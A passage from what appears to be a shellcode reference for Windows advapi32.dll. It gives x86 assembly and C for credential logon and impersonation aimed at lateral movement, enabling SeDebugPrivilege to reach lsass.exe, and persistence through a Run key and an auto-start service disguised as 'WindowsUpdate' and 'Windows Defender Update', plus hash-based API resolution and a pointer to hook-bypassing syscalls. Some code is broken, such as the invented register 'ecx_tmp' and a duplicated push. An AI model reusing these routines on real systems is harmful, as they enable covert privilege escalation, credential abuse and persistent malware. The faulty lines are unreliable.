#define LOGON32_LOGON_INTERACTIVE       2   // full logon, loads user profile
#define LOGON32_LOGON_NETWORK           3   // lightweight network logon
#define LOGON32_LOGON_BATCH             4   // batch job logon
#define LOGON32_LOGON_SERVICE           5   // service logon
#define LOGON32_LOGON_NETWORK_CLEARTEXT 8   // network logon with credentials available for delegation
#define LOGON32_LOGON_NEW_CREDENTIALS   9   // use supplied credentials for outbound connections only
```

**Return value:**
- Non-zero (TRUE) on success; `phToken` receives the user token.
- `0` (FALSE) on failure (`GetLastError` → `ERROR_LOGON_FAILURE (1326)` for bad credentials).

> **Privilege requirement:** `LogonUserA` requires the caller to hold `SeTcbPrivilege` ("Act as part of the operating system") or `SeChangeNotifyPrivilege`. In practice, services running as SYSTEM can call it; regular user-mode shellcode usually cannot unless it has already escalated.

**x86 push sequence:**

```nasm
sub  esp, 4
mov  ebx, esp          ; &hToken

; Strings: "Administrator\x00", ".\x00", "Password123\x00"
; (use call/pop technique as shown in LookupPrivilegeValueA)
; Assume: ECX=username, EDX=domain, EAX=password (pointers)

push ebx               ; phToken = &hToken
push 0                 ; dwLogonProvider = LOGON32_PROVIDER_DEFAULT
push 2                 ; dwLogonType = LOGON32_LOGON_INTERACTIVE
push eax               ; lpszPassword
push edx               ; lpszDomain
push ecx               ; lpszUsername
push 0xCF68EE84        ; hash for LogonUserA
call ebp               ; EAX = nonzero on success
```

**ROR-13 hash:** `0xCF68EE84`

---

### ImpersonateLoggedOnUser

**Prototype:**

```c
BOOL ImpersonateLoggedOnUser(
    HANDLE hToken   // [in] token from LogonUserA or OpenProcessToken/DuplicateToken
);
```

**Purpose:** Causes the calling thread to impersonate the security context of a logged-on user. After this call, the thread runs with the security context of the token's owner. Used after `LogonUserA` to become another user, or after `OpenProcessToken` on a privileged process.

**Return value:**
- Non-zero (TRUE) on success.
- `0` (FALSE) on failure.

**Reverting impersonation:** Call `RevertToSelf` (also in `advapi32.dll`) to return to the original thread security context.

**x86 push sequence:**

```nasm
; Assumes EBX contains the token handle
push ebx               ; hToken
push 0xA64EA254        ; hash for ImpersonateLoggedOnUser
call ebp               ; thread now impersonates hToken's user

; ... do privileged work ...

; Revert:
push 0x0EDCE3C5        ; hash for RevertToSelf (no args)
call ebp
```

**ROR-13 hash:** `0xA64EA254`

---

## Privilege Escalation Pattern: Enable SeDebugPrivilege

This is the most common `advapi32.dll` pattern in shellcode. `SeDebugPrivilege` allows the holder to open handles to any process with `PROCESS_ALL_ACCESS`, bypassing the normal DACL check. It is required to inject into SYSTEM-owned processes like `lsass.exe`.

**C pseudocode:**

```c
HANDLE hToken;
LUID luid;
TOKEN_PRIVILEGES tp;

// 1. Open current process token
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

// 2. Look up the LUID for SeDebugPrivilege
LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);

// 3. Build TOKEN_PRIVILEGES
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // = 0x2

// 4. Enable the privilege
AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
// Check: GetLastError() == 0 (not ERROR_NOT_ALL_ASSIGNED = 0x514)

// 5. Close the token handle
CloseHandle(hToken);
```

**Complete x86 assembly sequence:**

```nasm
; ============================================================
; Enable SeDebugPrivilege — Complete x86 Sequence
; Assumes: EBP = block_api stub (advapi32 + kernel32 loaded)
; ============================================================

; ---- Step 1: OpenProcessToken ----
sub  esp, 4            ; space for hToken output
mov  ebx, esp          ; EBX = &hToken
push ebx               ; TokenHandle = &hToken
push 0x00000028        ; DesiredAccess = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
push 0xFFFFFFFF        ; ProcessHandle = GetCurrentProcess() pseudo-handle
push 0xFB8F85E6        ; hash for OpenProcessToken
call ebp               ; EAX = nonzero on success
mov  esi, [ebx]        ; ESI = hToken

; ---- Step 2: LookupPrivilegeValueA("SeDebugPrivilege") ----
sub  esp, 8            ; space for LUID output
mov  edi, esp          ; EDI = &luid

; "SeDebugPrivilege\x00" via call/pop (NASM syntax):
jmp  short after_privstring
privstring:
    db 'SeDebugPrivilege', 0
after_privstring:
call privstring - $ - 5
pop  ecx               ; ECX = pointer to "SeDebugPrivilege\x00"

push edi               ; lpLuid = &luid
push ecx               ; lpName = "SeDebugPrivilege"
xor  eax, eax
push eax               ; lpSystemName = NULL (local system)
push 0xE60A0FEB        ; hash for LookupPrivilegeValueA
call ebp               ; EAX = nonzero on success
; [edi]   = luid.LowPart
; [edi+4] = luid.HighPart

; ---- Step 3: Build TOKEN_PRIVILEGES on stack ----
; Layout: PrivilegeCount(4) | Luid.LowPart(4) | Luid.HighPart(4) | Attributes(4)
; Build from bottom up (remember stack grows down: push in reverse order):
push 2                 ; Attributes = SE_PRIVILEGE_ENABLED (0x2)
push dword [edi+4]     ; Luid.HighPart
push dword [edi]       ; Luid.LowPart
push 1                 ; PrivilegeCount = 1
mov  ecx, esp          ; ECX = &TOKEN_PRIVILEGES (16 bytes total)

; ---- Step 4: AdjustTokenPrivileges ----
xor  eax, eax
push eax               ; ReturnLength = NULL
push eax               ; PreviousState = NULL
push 16                ; BufferLength = sizeof(TOKEN_PRIVILEGES) = 16
push ecx               ; NewState = &TOKEN_PRIVILEGES
push eax               ; DisableAllPrivileges = FALSE (0)
push esi               ; TokenHandle = hToken
push 0x3A8C5FF1        ; hash for AdjustTokenPrivileges
call ebp               ; EAX = nonzero on success

; ---- Step 5: Check GetLastError (optional but correct) ----
push 0x7C0017A5        ; hash for GetLastError (kernel32) — see kernel32.md
call ebp               ; EAX = last error
test eax, eax
jnz  priv_not_assigned ; EAX != 0: ERROR_NOT_ALL_ASSIGNED or other error
; EAX = 0: privilege successfully enabled

; ---- Step 6: CloseHandle(hToken) ----
push esi               ; hObject = hToken
push 0x35169BEC        ; hash for CloseHandle (kernel32)
call ebp

priv_not_assigned:
; handle the case where SeDebugPrivilege is not assigned
; (running in a limited account without the privilege in the token)
```

**WinDbg verification (check if SeDebugPrivilege is enabled):**

```
0:000> !token
// shows current process token privileges

0:000> dt _TOKEN_PRIVILEGES
// or use:
!process 0 0x10   ; show privileges for all processes
```

---

## Registry Persistence Pattern

Writing a payload path to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` — the most common user-land persistence mechanism. Survives logoff/logon cycles; runs the payload each time the user logs in.

**C pseudocode:**

```c
HKEY hKey;
const char *subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const char *valueName = "WindowsUpdate";
const char *payloadPath = "C:\\Users\\Public\\update.exe";

RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);
RegSetValueExA(hKey, valueName, 0, REG_SZ,
               (BYTE*)payloadPath, strlen(payloadPath) + 1);
RegCloseKey(hKey);
```

**Variations:**

| Registry Path | Scope | Notes |
|---|---|---|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Current user | No admin required |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | All users | Requires admin |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | One-time, current user | Deleted after execution |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` (Userinit) | System | Modify existing value |
| `HKLM\SYSTEM\CurrentControlSet\Services` | Service | Requires admin |

**Complete x86 assembly sequence (HKCU Run key persistence):**

```nasm
; ============================================================
; HKCU Run Key Persistence — x86 Assembly
; ============================================================

; ---- Step 1: RegOpenKeyExA ----
sub  esp, 4
mov  ebx, esp          ; EBX = &hkResult

jmp  short after_run_subkey
run_subkey:
    db "Software\Microsoft\Windows\CurrentVersion\Run", 0
after_run_subkey:
call run_subkey - $ - 5
pop  ecx               ; ECX = subkey path

push ebx               ; phkResult = &hkResult
xor  eax, eax
mov  ax, 0x0002        ; KEY_SET_VALUE = 0x0002
push eax               ; samDesired = KEY_SET_VALUE
xor  eax, eax
push eax               ; ulOptions = 0
push ecx               ; lpSubKey = "Software\Microsoft\Windows\..."
push 0x80000001        ; hKey = HKEY_CURRENT_USER (0x80000001)
push 0xC3B52E05        ; hash for RegOpenKeyExA
call ebp               ; EAX = 0 (ERROR_SUCCESS)
mov  esi, [ebx]        ; ESI = opened Run key handle

; ---- Step 2: RegSetValueExA ----
jmp  short after_reg_data
reg_payload:
    db "C:\Users\Public\update.exe", 0
reg_valuename:
    db "WindowsUpdate", 0
after_reg_data:
call reg_payload - $ - 5
pop  edx               ; EDX = payload path string

call reg_valuename - $ - 5
pop  ecx               ; ECX = value name string

; Calculate cbData = strlen(payload) + 1
push edi               ; save EDI
mov  edi, edx          ; EDI = payload path
xor  eax, eax
xor  ecx_tmp, ecx_tmp
not  ecx_tmp           ; 0xFFFFFFFF
repne scasb
not  ecx_tmp           ; byte count including null
pop  edi
push ecx_tmp           ; cbData = strlen + 1

push edx               ; lpData = payload path
push 1                 ; dwType = REG_SZ
xor  eax, eax
push eax               ; Reserved = 0
push ecx               ; lpValueName = "WindowsUpdate"
push esi               ; hKey = Run key handle
push 0x08B4D40E        ; hash for RegSetValueExA
call ebp               ; EAX = 0 on success

; ---- Step 3: RegCloseKey ----
push esi               ; hKey
push 0x7E43B3B0        ; hash for RegCloseKey
call ebp
```

---

## Service-Based Persistence Pattern

Creating a Windows service for system-level persistence. Services can run as `SYSTEM`, survive logoff, and start before any user logs in.

**C pseudocode:**

```c
SC_HANDLE hSCM, hSvc;

// 1. Open the Service Control Manager
hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);

// 2. Create the service
hSvc = CreateServiceA(
    hSCM,
    "WinDefUpdate",             // service name (registry key)
    "Windows Defender Update",  // display name
    SERVICE_ALL_ACCESS,         // 0xF01FF
    SERVICE_WIN32_OWN_PROCESS,  // 0x10
    SERVICE_AUTO_START,         // 0x2
    SERVICE_ERROR_NORMAL,       // 0x1
    "C:\\Windows\\Temp\\svc.exe", // binary path
    NULL, NULL, NULL,
    NULL,                       // run as LocalSystem
    NULL
);

// 3. Start the service immediately
StartServiceA(hSvc, 0, NULL);

// 4. Cleanup
CloseServiceHandle(hSvc);
CloseServiceHandle(hSCM);
```

**x86 assembly outline:**

```nasm
; Open SCM
xor  eax, eax
push 0xF003F           ; SC_MANAGER_ALL_ACCESS — use register:
mov  ecx, 0xF003F
push ecx
push eax               ; lpDatabaseName = NULL
push eax               ; lpMachineName = NULL
push 0x98167B4B        ; OpenSCManagerA
call ebp
mov  edi, eax          ; EDI = hSCM

; Build strings (binary path, service name, display name)
; [omitted for brevity — use call/pop technique]

; CreateServiceA (13 args — push right to left)
xor  eax, eax
push eax               ; lpPassword = NULL
push eax               ; lpServiceStartName = NULL (LocalSystem)
push eax               ; lpDependencies = NULL
push eax               ; lpdwTagId = NULL
push eax               ; lpLoadOrderGroup = NULL
push [binarypath_ptr]  ; lpBinaryPathName
push 1                 ; dwErrorControl = SERVICE_ERROR_NORMAL
push 2                 ; dwStartType = SERVICE_AUTO_START
push 0x10              ; dwServiceType = SERVICE_WIN32_OWN_PROCESS
mov  ecx, 0xF01FF
push ecx               ; dwDesiredAccess = SERVICE_ALL_ACCESS
push [displayname_ptr] ; lpDisplayName
push [servicename_ptr] ; lpServiceName
push edi               ; hSCManager
push 0xDFC3B6B9        ; CreateServiceA
call ebp
mov  esi, eax          ; ESI = hService

; Start the service
xor  eax, eax
push eax               ; lpServiceArgVectors = NULL
push eax               ; dwNumServiceArgs = 0
push esi               ; hService
push 0xD28E9B5A        ; StartServiceA
call ebp
```

---

## Calling Convention Notes

### x86 stdcall

All `advapi32.dll` functions on x86 Windows use `__stdcall`:
- Arguments pushed right-to-left on the stack.
- **Callee** cleans the stack (`RETN N` where N = arg count × 4).
- Return value in `EAX` (BOOL, LONG, HANDLE, pointer).
- 64-bit return values in `EDX:EAX` (rare in this DLL).

```nasm
; The caller does NOT need to adjust ESP after the call:
push arg3
push arg2
push arg1
call OpenProcessToken  ; function executes RETN 12 (3 args × 4 bytes)
; ESP is automatically restored to pre-push value on return
```

### x64 fastcall

On x64 Windows:
- First 4 args in `RCX`, `RDX`, `R8`, `R9`.
- Remaining args on the stack.
- Caller allocates 32 bytes of "shadow space" for spilling registers.
- Return value in `RAX`.

```nasm
; x64 AdjustTokenPrivileges example:
mov  rcx, [rbp + hToken]  ; arg1: TokenHandle
xor  rdx, rdx             ; arg2: DisableAllPrivileges = FALSE
lea  r8,  [rbp + tp]      ; arg3: NewState
mov  r9d, 16              ; arg4: BufferLength = 16
sub  rsp, 32 + 8 + 8      ; shadow space + 2 stack args + alignment
xor  eax, eax
mov  [rsp+32], rax        ; arg5: PreviousState = NULL
mov  [rsp+40], rax        ; arg6: ReturnLength = NULL
call AdjustTokenPrivileges
add  rsp, 32 + 8 + 8      ; restore stack
```

### Hash-based resolution applies to advapi32

The same `block_api` stub used for `kernel32.dll` and `ws2_32.dll` (see `ntdll.md`) resolves `advapi32.dll` functions. Since `advapi32.dll` is in the PEB module list by default, no explicit `LoadLibraryA` call is needed.

```nasm
; Resolve and call OpenProcessToken without LoadLibraryA:
push 0xFB8F85E6        ; hash for OpenProcessToken (advapi32)
call ebp               ; block_api finds it via PEB walk
```

---

## Common Mistakes and Pitfalls

### 1. ERROR_NOT_ALL_ASSIGNED after AdjustTokenPrivileges

`AdjustTokenPrivileges` returns TRUE (success) even when it cannot enable all requested privileges. It sets `GetLastError` to `ERROR_NOT_ALL_ASSIGNED (0x514 = 1300)` in this case. Shellcode that calls `AdjustTokenPrivileges` and proceeds without checking `GetLastError` may silently fail to gain the privilege.

```c
// Wrong: only checking return value
if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
    // error handling
}
// At this point, GetLastError() might be ERROR_NOT_ALL_ASSIGNED!
// The privilege was NOT enabled, but we don't know.

// Correct:
BOOL ret = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
if (!ret || GetLastError() != ERROR_SUCCESS) {
    // handle failure
}
```

### 2. TOKEN_ADJUST_PRIVILEGES vs. TOKEN_ALL_ACCESS

When calling `OpenProcessToken`, the `DesiredAccess` must include at least `TOKEN_ADJUST_PRIVILEGES (0x20)` to call `AdjustTokenPrivileges`. Requesting `TOKEN_ALL_ACCESS (0xF01FF)` is simpler but may fail with `ERROR_ACCESS_DENIED` on hardened systems. Use the minimum access required.

### 3. Predefined key handles are not real handles

`HKEY_LOCAL_MACHINE (0x80000002)` and other predefined keys are not actual kernel object handles. Do **not** pass them to `CloseHandle` (from `kernel32.dll`) — use `RegCloseKey` for all registry handles including predefined ones (though `RegCloseKey` on a predefined key is a no-op, it is safe).

```c
// Wrong: calling CloseHandle on a registry key
CloseHandle(hkResult);  // hkResult from RegOpenKeyExA — this is WRONG

// Correct:
RegCloseKey(hkResult);  // always use RegCloseKey for registry handles
```

### 4. LOGON32_LOGON_NETWORK_CLEARTEXT vs. INTERACTIVE for lateral movement

When using `LogonUserA` for lateral movement or credential testing, `LOGON32_LOGON_NETWORK (3)` creates a token without network credentials, while `LOGON32_LOGON_NEW_CREDENTIALS (9)` uses the supplied credentials only for outbound connections (the local security context remains unchanged). Choose the logon type based on the intended use:

```c
// To run a process as another user locally:
LogonUserA(user, domain, pass, LOGON32_LOGON_INTERACTIVE, 0, &hToken);
CreateProcessAsUserA(hToken, ...);

// To use credentials for outbound network access while appearing as current user:
LogonUserA(user, domain, pass, LOGON32_LOGON_NEW_CREDENTIALS, 0, &hToken);
ImpersonateLoggedOnUser(hToken);
// ...outbound connections now use the supplied credentials
```

### 5. Key access flags for 32-bit shellcode on 64-bit systems

On a 64-bit Windows system running 32-bit shellcode (WOW64), the registry is virtualized. A 32-bit process writing to `HKLM\Software\...` may actually write to `HKLM\Software\Wow6432Node\...`. To ensure the 64-bit registry view is written (e.g., to persist across both 32-bit and 64-bit contexts), include `KEY_WOW64_64KEY (0x100)` in `samDesired`:

```nasm
; 32-bit shellcode, writing to 64-bit registry hive:
mov  eax, KEY_SET_VALUE | KEY_WOW64_64KEY  ; 0x0002 | 0x0100 = 0x0102
push eax
; ... rest of RegOpenKeyExA args
```

### 6. Service binary path must be an absolute path with quotes if it contains spaces

```c
// Wrong: path with spaces, no quotes
CreateServiceA(..., "C:\\Program Files\\evil.exe", ...);
// Service will fail to start (command line parsing issue)

// Correct: quote the path
CreateServiceA(..., "\"C:\\Program Files\\evil.exe\"", ...);
// Or use a path without spaces:
CreateServiceA(..., "C:\\Windows\\Temp\\evil.exe", ...);
```

### 7. CryptGenRandom requires CryptAcquireContextA first

There is no "stateless" version of `CryptGenRandom`. The `hProv` handle from `CryptAcquireContextA` must be obtained before calling `CryptGenRandom`. Failing to do so results in `ERROR_INVALID_HANDLE`.

---

*See also: `kernel32.md` for `GetCurrentProcess`, `CloseHandle`, `OpenProcess`, `CreateProcessAsUserA`, `WaitForSingleObject`. See `ntdll.md` for `NtAdjustPrivilegesToken`, `NtOpenProcessToken`, and direct syscall alternatives that bypass advapi32 hooks.*
